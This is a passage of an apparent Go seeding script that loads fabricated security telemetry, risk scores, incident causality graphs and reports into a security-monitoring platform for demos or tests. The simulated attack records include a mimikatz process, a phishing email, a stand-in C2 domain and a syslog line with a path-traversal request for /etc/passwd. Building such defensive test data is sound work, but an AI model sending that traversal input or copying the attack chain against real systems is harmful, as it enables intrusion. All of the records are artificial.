				"dst_ip": "10.1.2.47", "dst_port": 445,
				"proto": "tcp", "direction": "outbound",
				"bytes_out": 4096, "bytes_in": 8192,
				"pid": 1920, "process_name": "mimikatz.exe",
				"user": "SYSTEM",
				"share": "ADMIN$",
			},
		},
		// ── xdr_data: dns (kind=5) ──────────────────────────────────────────
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindDNS,
			agentID: "agent-00001", hostname: "WKSTN-047", srcIP: "10.1.2.47",
			sessionID: "session-wzcp-001", hoursAgo: 1.0,
			fields: map[string]any{
				"query":       "cdn-updates.evil-c2.ru",
				"query_type":  "A",
				"response_ip": "185.220.101.15",
				"ttl":         30,
				"pid":         7744, "process_name": "rclone.exe",
				"entropy":     4.12,
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindDNS,
			agentID: "agent-00003", hostname: "WEB-FRONT-02", srcIP: "10.2.1.20",
			sessionID: "session-wzcp-003", hoursAgo: 14.5,
			fields: map[string]any{
				"query":      "xvzqmpbwkjhfrt.cdn-stats24.net",
				"query_type": "A",
				"response":   "NXDOMAIN",
				"entropy":    5.87,
				"pid":        2048, "process_name": "nginx",
			},
		},
		// ── xdr_data: auth (kind=6) ─────────────────────────────────────────
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindAuth,
			agentID: "agent-00003", hostname: "DC-PROD-01", srcIP: "10.0.0.1",
			sessionID: "session-wzcp-004", hoursAgo: 4.5,
			fields: map[string]any{
				"action":        "logon",
				"auth_type":     "ntlm",
				"logon_type":    3,
				"user":          "jdoe",
				"user_domain":   "CORP",
				"src_ip":        "10.1.5.3",
				"src_workstation": "SRV-DB-03",
				"result":        "success",
				"event_id":      4624,
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindAuth,
			agentID: "agent-00010", hostname: "SRV-MAIL-01", srcIP: "10.1.6.2",
			sessionID: "session-wzcp-010", hoursAgo: 23.0,
			fields: map[string]any{
				"action":     "logon_failure",
				"auth_type":  "kerberos",
				"logon_type": 10,
				"user":       "admin",
				"src_ip":     "91.241.19.55",
				"result":     "bad_password",
				"event_id":   4625,
				"failure_count": 147,
			},
		},
		// ── xdr_data: vuln (kind=7) ─────────────────────────────────────────
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindVuln,
			agentID: "agent-00001", hostname: "WKSTN-047", srcIP: "10.1.2.47",
			sessionID: "session-wzcp-001", hoursAgo: 48.0,
			fields: map[string]any{
				"cve_id":       "CVE-2024-21413",
				"title":        "Microsoft Outlook RCE via NTLM relay",
				"severity":     "critical",
				"cvss_score":   9.8,
				"package_name": "Microsoft Outlook",
				"package_version": "16.0.17628.20000",
				"fixed_version": "16.0.17830.20000",
				"status":       "open",
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindVuln,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-wzcp-002", hoursAgo: 48.0,
			fields: map[string]any{
				"cve_id":          "CVE-2024-3094",
				"title":           "XZ Utils backdoor in liblzma",
				"severity":        "critical",
				"cvss_score":      10.0,
				"package_name":    "xz-utils",
				"package_version": "5.6.0",
				"fixed_version":   "5.4.6",
				"status":          "in_progress",
			},
		},
		// ── xdr_data: integrity / FIM (kind=8) ──────────────────────────────
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindIntegrity,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-wzcp-002", hoursAgo: 2.5,
			fields: map[string]any{
				"action":        "modified",
				"path":          "/etc/passwd",
				"old_hash":      "abc123def456",
				"new_hash":      "def456abc789",
				"size_before":   1824, "size_after": 1891,
				"uid":           0, "gid": 0,
				"mode_before":   "0644", "mode_after": "0644",
				"changed_fields": []string{"content", "mtime"},
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindIntegrity,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-wzcp-002", hoursAgo: 2.8,
			fields: map[string]any{
				"action":   "created",
				"path":     "/tmp/.hidden_backdoor",
				"new_hash": "feedcafe1234567890abcdef",
				"size_after": 102400,
				"uid": 0, "gid": 0, "mode_after": "0755",
			},
		},
		// ── syslog_raw ────────────────────────────────────────────────────────
		{
			dataset: model.DatasetSyslog, kind: model.LogKindSyslog,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-syslog-001", hoursAgo: 3.5,
			rawLog: "<34>May 24 01:15:22 SRV-DB-03 sudo: devops : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/bin/bash",
		},
		{
			dataset: model.DatasetSyslog, kind: model.LogKindSyslog,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-syslog-001", hoursAgo: 3.4,
			rawLog: "<34>May 24 01:16:08 SRV-DB-03 sshd[2948]: Failed password for devops from 10.1.5.100 port 52344 ssh2",
		},
		{
			dataset: model.DatasetSyslog, kind: model.LogKindSyslog,
			agentID: "agent-00003", hostname: "WEB-FRONT-02", srcIP: "10.2.1.20",
			sessionID: "session-syslog-002", hoursAgo: 15.0,
			rawLog: `<14>May 24 12:00:01 WEB-FRONT-02 nginx: 91.241.19.55 - - [24/May/2026:12:00:01 +0000] "GET /admin/../../../../../etc/passwd HTTP/1.1" 403 150`,
		},
		{
			dataset: model.DatasetSyslog, kind: model.LogKindSyslog,
			agentID: "agent-00008", hostname: "NAS-BACKUP-01", srcIP: "10.1.8.1",
			sessionID: "session-syslog-003", hoursAgo: 78.0,
			rawLog: "<6>May 22 06:30:00 NAS-BACKUP-01 rsync[4411]: [sender] ./backup_2026-05-22.tar.gz",
		},
		// ── ngfw_traffic ──────────────────────────────────────────────────────
		{
			dataset: model.DatasetNGFW, kind: 0,
			hostname: "FIREWALL-EXT-01", srcIP: "203.0.113.1",
			hoursAgo: 1.0,
			fields: map[string]any{
				"action":       "deny",
				"rule":         "fw-deny-9821",
				"src_ip":       "185.220.101.15", "src_port": 443,
				"dst_ip":       "10.1.2.47", "dst_port": 8443,
				"proto":        "tcp",
				"bytes_in":     512, "bytes_out": 0,
				"threat_id":    "TOR-Exit-Node",
				"threat_category": "command-and-control",
			},
		},
		{
			dataset: model.DatasetNGFW, kind: 0,
			hostname: "FIREWALL-EXT-01", srcIP: "203.0.113.1",
			hoursAgo: 6.0,
			fields: map[string]any{
				"action":   "allow",
				"rule":     "default-outbound",
				"src_ip":   "10.1.4.7", "src_port": 52100,
				"dst_ip":   "13.107.42.14", "dst_port": 443,
				"proto":    "tcp",
				"bytes_in": 1024, "bytes_out": 5368709120,
				"application": "onedrive",
			},
		},
		// ── network_story ────────────────────────────────────────────────────
		{
			dataset: model.DatasetNetwork, kind: 0,
			hostname: "FIREWALL-EXT-01", srcIP: "203.0.113.1",
			hoursAgo: 7.0,
			fields: map[string]any{
				"flow_type":   "netflow_v9",
				"src_ip":      "10.1.5.3", "src_port": 445,
				"dst_ip":      "10.1.2.47", "dst_port": 445,
				"proto":       "tcp",
				"bytes":       1048576, "packets": 1024,
				"duration_ms": 3200,
				"direction":   "lateral",
			},
		},
		{
			dataset: model.DatasetNetwork, kind: 0,
			hostname: "FIREWALL-EXT-01", srcIP: "203.0.113.1",
			hoursAgo: 22.0,
			fields: map[string]any{
				"flow_type": "netflow_v9",
				"src_ip":    "10.1.4.7", "src_port": 51000,
				"dst_ip":    "91.241.19.55", "dst_port": 4444,
				"proto":     "tcp",
				"bytes":     2048, "packets": 20,
				"direction": "outbound",
				"flag":      "SYN",
			},
		},
		// ── idp_raw ──────────────────────────────────────────────────────────
		{
			dataset: model.DatasetIDP, kind: 0,
			hostname: "DC-PROD-01", srcIP: "10.0.0.1",
			hoursAgo: 4.0,
			fields: map[string]any{
				"event_type":     "authentication",
				"provider":       "active_directory",
				"user":           "jdoe",
				"user_domain":    "CORP",
				"src_ip":         "10.1.5.3",
				"auth_type":      "ntlm",
				"logon_type":     3,
				"result":         "success",
				"event_id":       4624,
				"workstation":    "SRV-DB-03",
			},
		},
		{
			dataset: model.DatasetIDP, kind: 0,
			hostname: "DC-PROD-01", srcIP: "10.0.0.1",
			hoursAgo: 17.0,
			fields: map[string]any{
				"event_type":  "group_membership_change",
				"provider":    "active_directory",
				"user":        "svc-backup",
				"group":       "Domain Admins",
				"action":      "add_member",
				"performed_by": "admin",
				"event_id":    4728,
			},
		},
		// ── identity_analytics (UEBA) ─────────────────────────────────────────
		{
			dataset: model.DatasetIdentity, kind: 0,
			hostname: "DC-PROD-01", srcIP: "10.0.0.1",
			hoursAgo: 4.5,
			fields: map[string]any{
				"event_type":       "anomalous_login",
				"user":             "admin",
				"risk_score":       92,
				"anomaly_reason":   "login_outside_baseline_hours",
				"baseline_hours":   "08:00-18:00",
				"actual_hour":      2,
				"src_ip":           "10.0.0.1",
				"geo_country":      "CN",
				"prev_login_geo":   "CN",
				"impossible_travel": false,
			},
		},
		{
			dataset: model.DatasetIdentity, kind: 0,
			hostname: "DC-PROD-01", srcIP: "10.0.0.1",
			hoursAgo: 27.0,
			fields: map[string]any{
				"event_type":     "kerberoasting_indicator",
				"user":           "jdoe",
				"risk_score":     85,
				"anomaly_reason": "kerberos_tgs_rc4_hmac",
				"spn_requested":  "HTTP/SRV-APP-07.corp.local",
				"src_ip":         "10.1.5.3",
				"encryption_type": "rc4-hmac",
				"ticket_type":    "TGS",
			},
		},
		// ── cloud_audit_log ───────────────────────────────────────────────────
		{
			dataset: model.DatasetCloud, kind: 0,
			hostname: "aws-prod-vpc", srcIP: "172.31.0.10",
			hoursAgo: 89.0,
			fields: map[string]any{
				"provider":       "aws",
				"event_type":     "iam_policy_change",
				"event_name":     "AttachUserPolicy",
				"user_arn":       "arn:aws:iam::123456789012:user/svc-terraform",
				"target_arn":     "arn:aws:iam::123456789012:user/svc-backup",
				"policy_arn":     "arn:aws:iam::aws:policy/AdministratorAccess",
				"src_ip":         "52.94.133.24",
				"region":         "us-east-1",
				"user_agent":     "terraform/1.7.5",
				"request_id":     "abcd1234-5678-90ef-ghij-klmnopqrstuv",
				"result":         "success",
			},
		},
		{
			dataset: model.DatasetCloud, kind: 0,
			hostname: "aws-prod-vpc", srcIP: "172.31.0.10",
			hoursAgo: 90.5,
			fields: map[string]any{
				"provider":    "aws",
				"event_type":  "s3_bucket_policy",
				"event_name":  "PutBucketPolicy",
				"user_arn":    "arn:aws:iam::123456789012:user/svc-terraform",
				"bucket_name": "corp-sensitive-data",
				"src_ip":      "52.94.133.24",
				"region":      "us-east-1",
				"public_access_enabled": true,
				"result": "success",
			},
		},
		// ── email_story ───────────────────────────────────────────────────────
		{
			dataset: model.DatasetEmail, kind: 0,
			hostname: "SRV-MAIL-01", srcIP: "10.1.6.2",
			hoursAgo: 9.5,
			fields: map[string]any{
				"event_type":       "delivery",
				"sender":           "phish@secure-login.evil.com",
				"recipient":        "ceo@corp.local",
				"subject":          "Urgent: Review Q1 Financial Statement",
				"has_attachment":   true,
				"attachment_name":  "Q1_Statement.xlsm",
				"attachment_hash":  "a1b2c3d4e5f6789012345678901234567890abcd",
				"verdict":          "malicious",
				"threat_category":  "phishing",
				"action":           "delivered",
				"sender_ip":        "91.241.19.55",
			},
		},
		{
			dataset: model.DatasetEmail, kind: 0,
			hostname: "SRV-MAIL-01", srcIP: "10.1.6.2",
			hoursAgo: 9.3,
			fields: map[string]any{
				"event_type":      "attachment_open",
				"sender":          "phish@secure-login.evil.com",
				"recipient":       "ceo@corp.local",
				"attachment_name": "Q1_Statement.xlsm",
				"attachment_hash": "a1b2c3d4e5f6789012345678901234567890abcd",
				"opened_by":       "ceo",
				"client_host":     "LAPTOP-CEO-01",
				"macro_executed":  true,
			},
		},
		// ── xdr_incident (denormalised view) ─────────────────────────────────
		{
			dataset: model.DatasetIncident, kind: 0,
			hostname: "WKSTN-047", srcIP: "10.1.2.47",
			hoursAgo: 2.0,
			fields: map[string]any{
				"incident_id":  "INC-00001",
				"alert_id":     "ALT-00001",
				"incident_name": "APT Attack — Credential Theft and Lateral Movement",
				"alert_name":   "Suspicious PowerShell encoded command execution",
				"severity":     "critical",
				"status":       "investigating",
				"host":         "WKSTN-047",
				"user":         "jdoe",
				"tactic":       "Lateral Movement",
				"smart_score":  91,
			},
		},
		// ── asset_inventory ───────────────────────────────────────────────────
		{
			dataset: model.DatasetAsset, kind: 0,
			agentID: "agent-00001", hostname: "WKSTN-047", srcIP: "10.1.2.47",
			hoursAgo: 24.0,
			fields: map[string]any{
				"snapshot_type":     "full",
				"os_type":           "windows",
				"os_version":        "11 22H2",
				"hostname":          "WKSTN-047",
				"ip":                "10.1.2.47",
				"agent_version":     "7.4.2",
				"installed_packages": []string{
					"Microsoft Outlook 16.0.17628.20000",
					"7-Zip 23.01",
					"Google Chrome 124.0.6367.207",
				},
				"open_ports": []int{135, 139, 445, 3389},
				"running_services": []string{"WSearch", "Spooler", "RpcSs"},
				"domain":           "CORP",
				"last_boot":        "2026-05-22T08:00:00Z",
			},
		},
		{
			dataset: model.DatasetAsset, kind: 0,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			hoursAgo: 24.0,
			fields: map[string]any{
				"snapshot_type": "full",
				"os_type":       "linux",
				"os_version":    "Ubuntu 22.04 LTS",
				"hostname":      "SRV-DB-03",
				"ip":            "10.1.5.3",
				"agent_version": "7.4.2",
				"installed_packages": []string{
					"xz-utils 5.6.0",
					"openssh-server 8.9p1",
					"postgresql-14 14.12",
				},
				"open_ports":       []int{22, 5432},
				"running_services": []string{"postgresql", "sshd", "cron"},
				"last_boot":        "2026-05-20T03:00:00Z",
			},
		},
	}

	logCount := 0
	for _, s := range logSpecs {
		ts := logAt(now, s.hoursAgo)
		entry := &model.LogEntry{
			TenantID:       tenantID,
			Dataset:        s.dataset,
			Kind:           s.kind,
			AgentID:        s.agentID,
			SessionID:      s.sessionID,
			Hostname:       s.hostname,
			SourceIP:       s.srcIP,
			Fields:         s.fields,
			RawLog:         s.rawLog,
			EventTimestamp: ts,
			IngestedAt:     now,
		}
		if err := logRepo.Create(ctx, entry); err != nil {
			fmt.Printf("warn log_entry [%s kind=%d host=%s]: %v\n", s.dataset, s.kind, s.hostname, err)
		} else {
			logCount++
		}
	}
	fmt.Printf("seeded %d log entries (%d datasets, %d WZCP kinds covered)\n",
		logCount, 10, 8)

	// ── 15. Identity Risks — UEBA user risk profiles ─────────────────────────
	type identityRiskSpec struct {
		userID, username, domain string
		score                    float64
		signals                  []model.RiskSignal
	}
	imposTravel := now.Add(-3 * time.Hour)
	identitySpecs := []identityRiskSpec{
		{
			"jdoe", "jdoe", "CORP", 91,
			[]model.RiskSignal{
				{Type: model.SignalImpossibleTravel, Score: 35, Detail: "Login from Beijing CN 3h after last seen in New York US", DetectedAt: now.Add(-3 * time.Hour)},
				{Type: model.SignalPrivilegeAnomaly, Score: 28, Detail: "First access to DC-PROD-01 domain admin share", DetectedAt: now.Add(-2 * time.Hour)},
				{Type: model.SignalActiveIncident, Score: 28, Detail: "Linked to INC: APT Attack — Credential Theft", DetectedAt: now.Add(-1 * time.Hour)},
			},
		},
		{
			"admin", "admin", "CORP", 74,
			[]model.RiskSignal{
				{Type: model.SignalTimeAnomaly, Score: 40, Detail: "Login at 03:14 local time — outside normal 08:00-19:00 window", DetectedAt: now.Add(-22 * time.Hour)},
				{Type: model.SignalActiveAlert, Score: 34, Detail: "Active critical alert: Admin account login outside business hours", DetectedAt: now.Add(-22 * time.Hour)},
			},
		},
		{
			"svc-backup", "svc-backup", "CORP", 55,
			[]model.RiskSignal{
				{Type: model.SignalNewDevice, Score: 30, Detail: "Authentication from unrecognised workstation KIOSK-LOBBY-01", DetectedAt: now.Add(-48 * time.Hour)},
				{Type: model.SignalAuthFailureRate, Score: 25, Detail: "14 failed logins in 5 minutes before successful auth", DetectedAt: now.Add(-48 * time.Hour)},
			},
		},
		{
			"ceo", "ceo", "CORP", 68,
			[]model.RiskSignal{
				{Type: model.SignalSensitiveFirstAccess, Score: 42, Detail: "Opened phishing attachment Q1_Statement.xlsm — macro executed", DetectedAt: now.Add(-10 * time.Hour)},
				{Type: model.SignalActiveAlert, Score: 26, Detail: "Active alert: Macro execution from CEO mailbox", DetectedAt: now.Add(-10 * time.Hour)},
			},
		},
		{
			"it-admin", "it-admin", "CORP", 22,
			[]model.RiskSignal{
				{Type: model.SignalAuthFailureRate, Score: 22, Detail: "Repeated login failures during scheduled maintenance window", DetectedAt: now.Add(-72 * time.Hour)},
			},
		},
	}
	for _, s := range identitySpecs {
		r := &model.IdentityRisk{
			TenantID: tenantID, UserID: s.userID, Username: s.username, Domain: s.domain,
			RiskScore:   s.score,
			RiskSignals: s.signals,
			Baseline: model.IdentityBaseline{
				LoginHoursP95:  [2]int{8, 19},
				TypicalCities:  []string{"New York", "San Jose"},
				KnownDevices:   []string{"WKSTN-047", "LAPTOP-CEO-01"},
				AvgDailyLogins: 4.2,
				UpdatedAt:      now.Add(-24 * time.Hour),
			},
			LastImpossibleTravel: func() *time.Time {
				if s.userID == "jdoe" { return &imposTravel }
				return nil
			}(),
			CreatedAt: now.Add(-30 * 24 * time.Hour),
			UpdatedAt: now,
		}
		must("identity_risk "+s.userID, identityRepo.Upsert(ctx, r))
	}
	fmt.Printf("seeded %d identity risks\n", len(identitySpecs))

	// ── 16. Exposure Scores — vuln × asset risk prioritisation ───────────────
	type exposureSpec struct {
		assetIdx        int
		cve             string
		cvss            float64
		priority        float64
		inWild          float64
		reachability    float64
		assetImportance float64
		fixStatus       model.FixStatus
	}
	exposureSpecs := []exposureSpec{
		{0, "CVE-2024-21413", 9.8, 97, 0.95, 0.8, 0.9, model.FixStatusUnplanned},
		{4, "CVE-2024-21413", 9.8, 94, 0.95, 0.7, 0.95, model.FixStatusUnplanned},
		{1, "CVE-2024-3094", 10.0, 93, 0.9, 0.85, 0.88, model.FixStatusPlanned},
		{1, "CVE-2024-6387", 8.1, 88, 0.85, 0.9, 0.88, model.FixStatusInProgress},
		{5, "CVE-2024-6387", 8.1, 82, 0.85, 0.75, 0.7, model.FixStatusPlanned},
		{2, "CVE-2024-1709", 10.0, 71, 0.5, 0.6, 0.95, model.FixStatusFixed},
		{5, "CVE-2024-27198", 9.8, 84, 0.6, 0.7, 0.7, model.FixStatusUnplanned},
		{8, "CVE-2024-20353", 8.6, 41, 0.3, 0.65, 0.55, model.FixStatusAccepted},
		{0, "CVE-2024-30078", 8.8, 77, 0.5, 0.75, 0.9, model.FixStatusInProgress},
		{4, "CVE-2024-30078", 8.8, 74, 0.5, 0.7, 0.95, model.FixStatusInProgress},
		{6, "CVE-2024-30078", 8.8, 60, 0.5, 0.55, 0.65, model.FixStatusPlanned},
		{0, "CVE-2023-38831", 7.8, 45, 0.55, 0.6, 0.9, model.FixStatusFixed},
	}
	deadline30 := now.Add(30 * 24 * time.Hour)
	for _, s := range exposureSpecs {
		score := &model.ExposureScore{
			TenantID:              tenantID,
			AssetID:               assetKeys[s.assetIdx],
			AssetName:             assetSpecs[s.assetIdx].name,
			CveID:                 s.cve,
			CvssScore:             s.cvss,
			PriorityScore:         s.priority,
			InWildFactor:          s.inWild,
			ReachabilityFactor:    s.reachability,
			AssetImportanceFactor: s.assetImportance,
			FixStatus:             s.fixStatus,
			FixDeadline: func() *time.Time {
				if s.fixStatus == model.FixStatusPlanned || s.fixStatus == model.FixStatusInProgress {
					return &deadline30
				}
				return nil
			}(),
			LastScoredAt: now,
		}
		must("exposure_score "+s.cve+"@"+assetSpecs[s.assetIdx].name, exposureRepo.Upsert(ctx, score))
	}
	fmt.Printf("seeded %d exposure scores\n", len(exposureSpecs))

	// ── 17. Causality Graphs — for 2 high-severity incidents ─────────────────
	// Use the first two incident keys (APT attack and ransomware campaign)
	graphSpecs := []struct {
		incIdx     int
		nodes      []model.CausalityNode
		edgePairs  [][3]int // [fromNodeIdx, toNodeIdx, weight*100]
		edgeTypes  []model.CausalityEdgeType
		confidence float64
	}{
		{
			incIdx:     0,
			confidence: 0.91,
			nodes: []model.CausalityNode{
				{NodeID: "n-user-jdoe", Type: model.NodeTypeUser, Label: "jdoe", IsRootCause: false,
					Properties: map[string]any{"username": "jdoe", "domain": "CORP", "last_seen": "WKSTN-047"}},
				{NodeID: "n-asset-wkstn047", Type: model.NodeTypeAsset, Label: "WKSTN-047", IsRootCause: false,
					Properties: map[string]any{"ip": "10.1.2.47", "os": "Windows 11"}},
				{NodeID: "n-proc-word", Type: model.NodeTypeProcess, Label: "winword.exe", IsRootCause: true,
					Properties: map[string]any{"pid": 1234, "cmdline": "WINWORD.EXE /n Q1_Statement.xlsm"}},
				{NodeID: "n-proc-ps", Type: model.NodeTypeProcess, Label: "powershell.exe",
					Properties: map[string]any{"pid": 4892, "cmdline": "powershell.exe -enc SQBFAFgA..."}},
				{NodeID: "n-file-locked", Type: model.NodeTypeFile, Label: "budget_2026.xlsx.locked",
					Properties: map[string]any{"path": "C:\\Users\\jdoe\\Documents\\budget_2026.xlsx.locked"}},
				{NodeID: "n-net-c2", Type: model.NodeTypeNetwork, Label: "185.220.101.15:443",
					Properties: map[string]any{"dst_ip": "185.220.101.15", "dst_port": 443, "proto": "tcp", "bytes_out": 2097152}},
				{NodeID: "n-alert-1", Type: model.NodeTypeAlert, Label: "Suspicious PowerShell",
					Properties: map[string]any{"severity": "critical"}},
			},
			edgePairs: [][3]int{{2, 3, 95}, {3, 4, 88}, {3, 5, 92}, {3, 6, 95}, {0, 2, 80}, {1, 2, 75}},
			edgeTypes: []model.CausalityEdgeType{
				model.EdgeTypeSpawned, model.EdgeTypeWroteFile, model.EdgeTypeConnectedTo,
				model.EdgeTypeTriggered, model.EdgeTypeAuthenticated, model.EdgeTypeAccessed,
			},
		},
		{
			incIdx:     1,
			confidence: 0.78,
			nodes: []model.CausalityNode{
				{NodeID: "n-user-svc", Type: model.NodeTypeUser, Label: "svc-backup", IsRootCause: true,
					Properties: map[string]any{"username": "svc-backup", "type": "service_account"}},
				{NodeID: "n-asset-dc", Type: model.NodeTypeAsset, Label: "DC-PROD-01",
					Properties: map[string]any{"ip": "10.0.0.1", "role": "domain_controller"}},
				{NodeID: "n-asset-db", Type: model.NodeTypeAsset, Label: "SRV-DB-03",
					Properties: map[string]any{"ip": "10.1.5.3", "role": "database"}},
				{NodeID: "n-proc-mimikatz", Type: model.NodeTypeProcess, Label: "mimikatz.exe",
					Properties: map[string]any{"pid": 7001, "hash": "cafebabe1234567890abcdef"}},
				{NodeID: "n-alert-ntlm", Type: model.NodeTypeAlert, Label: "NTLM Relay Attack",
					Properties: map[string]any{"severity": "critical"}},
			},
			edgePairs: [][3]int{{0, 1, 85}, {1, 2, 90}, {0, 3, 80}, {3, 4, 88}},
			edgeTypes: []model.CausalityEdgeType{
				model.EdgeTypeAuthenticated, model.EdgeTypeLateralMove, model.EdgeTypeSpawned, model.EdgeTypeTriggered,
			},
		},
	}

	causalityCount := 0
	for _, gs := range graphSpecs {
		incidentID := incKey(gs.incIdx)
		if incidentID == "" {
			continue
		}
		nodes := make([]model.CausalityNode, len(gs.nodes))
		for i, n := range gs.nodes {
			n.IncidentID = incidentID
			nodes[i] = n
		}

		edges := make([]model.CausalityEdge, len(gs.edgePairs))
		for i, ep := range gs.edgePairs {
			fromNodeID := gs.nodes[ep[0]].NodeID
			toNodeID := gs.nodes[ep[1]].NodeID
			ts := now.Add(-time.Duration(i) * 5 * time.Minute)
			edges[i] = model.CausalityEdge{
				From:       "causality_nodes/" + fromNodeID,
				To:         "causality_nodes/" + toNodeID,
				IncidentID: incidentID,
				Type:       gs.edgeTypes[i],
				Timestamp:  &ts,
				Weight:     float64(ep[2]) / 100.0,
			}
		}

		graph := &model.CausalityGraph{
			IncidentID:  incidentID,
			TimeWindowH: 24,
			Confidence:  gs.confidence,
			Nodes:       nodes,
			Edges:       edges,
			NodeCount:   len(nodes),
			EdgeCount:   len(edges),
			GeneratedAt: now,
		}
		if err := causalityRepo.Upsert(ctx, graph); err != nil {
			fmt.Printf("warn causality graph for incident %s: %v\n", incidentID, err)
		} else {
			causalityCount++
		}
	}
	fmt.Printf("seeded %d causality graphs\n", causalityCount)

	// ── 18. Reports — cover all template_type + status ───────────────────────
	type reportSpec struct {
		name, desc  string
		tmplType    model.ReportTemplateType
		status      model.ReportStatus
		daysAgo     int
		genDaysAgo  int
	}
	genAt := func(d int) *time.Time { t := now.Add(-time.Duration(d) * 24 * time.Hour); return &t }
	reportSpecs := []reportSpec{
		{"SOC Weekly Report 2026-W20", "Weekly SOC operational report for the week ending 2026-05-17.", model.ReportTemplateWeekly, model.ReportStatusReady, 7, 7},
		{"SOC Weekly Report 2026-W21", "Weekly SOC operational report for the week ending 2026-05-24.", model.ReportTemplateWeekly, model.ReportStatusGenerating, 0, 0},
		{"Monthly Executive Brief — April 2026", "Executive-level security posture summary for April 2026.", model.ReportTemplateExec, model.ReportStatusReady, 24, 24},
		{"Monthly Executive Brief — May 2026", "Executive-level security posture summary for May 2026.", model.ReportTemplateExec, model.ReportStatusPending, 0, 0},
		{"Vulnerability Remediation Report Q1 2026", "Full vulnerability inventory with remediation status and SLA tracking.", model.ReportTemplateCustom, model.ReportStatusReady, 54, 54},
		{"SOC Monthly Report — April 2026", "Detailed monthly SOC activity: alerts, incidents, MTTR, SLA compliance.", model.ReportTemplateMonthly, model.ReportStatusReady, 24, 24},
		{"Threat Hunt Campaign — Cobalt Strike IOCs", "Custom report for internal threat hunt targeting Cobalt Strike beacon patterns.", model.ReportTemplateCustom, model.ReportStatusFailed, 3, 3},
	}
	for i, s := range reportSpecs {
		r := &model.Report{
			TenantID:     tenantID,
			Name:         s.name,
			Description:  s.desc,
			TemplateType: s.tmplType,
			Status:       s.status,
			Config:       map[string]any{"format": "PDF", "period": s.name},
			CreatedBy:    "admin",
			CreatedAt:    now.Add(-time.Duration(s.daysAgo) * 24 * time.Hour),
			UpdatedAt:    now,
		}
		if s.status == model.ReportStatusReady {
			r.DownloadURL = fmt.Sprintf("/api/reports/report-%03d/download", i+1)
			r.GeneratedAt = genAt(s.genDaysAgo)
		} else if s.status == model.ReportStatusFailed {
			r.GeneratedAt = genAt(s.genDaysAgo)
		}
		must("report "+s.name, reportRepo.Create(ctx, r))
	}
	fmt.Printf("seeded %d reports\n", len(reportSpecs))

	// ── 19. Agent Policies ────────────────────────────────────────────────────
	type policySpec struct {
		name, desc string
		isDefault  bool
		agentCount int
	}
	policySpecs := []policySpec{
		{"Default Endpoint Policy", "Standard collection policy for all managed workstations and servers.", true, 9},
		{"High-Security Servers", "Enhanced collection for critical servers: full process tree + network + file.", false, 3},
		{"Executive Laptops", "Tailored policy for executive endpoints: low-noise, high-fidelity.", false, 2},
		{"DMZ Servers", "DMZ-specific policy with network-heavy collection and reduced process noise.", false, 1},
		{"IoT / Legacy Devices", "Minimal-footprint policy for IoT and legacy endpoints.", false, 2},
	}
	for i, s := range policySpecs {
		p := &model.AgentPolicy{
			TenantID:    tenantID,
			Name:        s.name,
			Description: s.desc,
			IsDefault:   s.isDefault,
			AgentCount:  s.agentCount,
			CollectionRules: map[string]any{
				"collect_process": true,
				"collect_network": i < 3,
				"collect_file":    i < 2,
				"collect_dns":     true,
				"sample_rate_hz":  []int{10, 50, 20, 30, 5}[i],
			},
			Settings: map[string]any{
				"heartbeat_interval_s": 30,
				"batch_size":           1000,
				"compression":          "zstd",
			},
			CreatedAt: now.Add(-time.Duration(i+1) * 30 * 24 * time.Hour),
			UpdatedAt: now,
		}
		must("agent_policy "+s.name, policyRepo.Create(ctx, p))
	}
	fmt.Printf("seeded %d agent_policies\n", len(policySpecs))

	// ── 20. Data Sources ──────────────────────────────────────────────────────
	lastEvt := func(h float64) *time.Time { t := now.Add(-time.Duration(h * float64(time.Hour))); return &t }
	type dsSpec struct {
		name, desc, typ string
		status          model.DataSourceStatus
		eventCount      int64
		lastEvtHours    float64
		tags            []string
		config          map[string]any
	}
	dsSpecs := []dsSpec{
		{"Windows Endpoints (WZCP)", "WZCP binary log frames from all managed Windows endpoints.", "wzcp", model.DataSourceStatusActive, 284917, 0.1,
			[]string{"endpoint", "windows"}, map[string]any{"port": 18090, "protocol": "xlog_binary", "agents": 9}},
		{"Palo Alto NGFW Syslog", "Syslog feed from Palo Alto PAN-OS firewall at perimeter.", "syslog", model.DataSourceStatusActive, 142308, 0.2,
			[]string{"network", "firewall"}, map[string]any{"host": "10.0.0.1", "port": 514, "format": "CEF"}},
		{"Wazuh SIEM (Linux)", "Wazuh agent events from Linux servers via syslog.", "syslog", model.DataSourceStatusActive, 88402, 0.5,
			[]string{"endpoint", "linux"}, map[string]any{"host": "wazuh-manager", "port": 1514}},
		{"Okta Identity Provider", "Okta system log via REST API polling.", "api", model.DataSourceStatusActive, 31204, 1.2,
			[]string{"identity", "saas"}, map[string]any{"api_url": "https://corp.okta.com/api/v1/logs", "poll_interval_s": 60}},
		{"AWS CloudTrail", "CloudTrail events via S3 bucket notification.", "aws_cloudtrail", model.DataSourceStatusActive, 19843, 0.8,
			[]string{"cloud", "aws"}, map[string]any{"region": "us-east-1", "s3_bucket": "corp-cloudtrail-logs"}},
		{"Cisco NetFlow", "NetFlow v9 from core switches and routers.", "netflow", model.DataSourceStatusActive, 7219043, 0.05,
			[]string{"network"}, map[string]any{"collector_port": 2055, "version": 9}},
		{"Office 365 Audit Log", "Microsoft 365 unified audit log via Management API.", "api", model.DataSourceStatusActive, 14821, 2.1,
			[]string{"email", "saas", "cloud"}, map[string]any{"tenant_id": "corp-m365-tenant", "poll_interval_s": 300}},
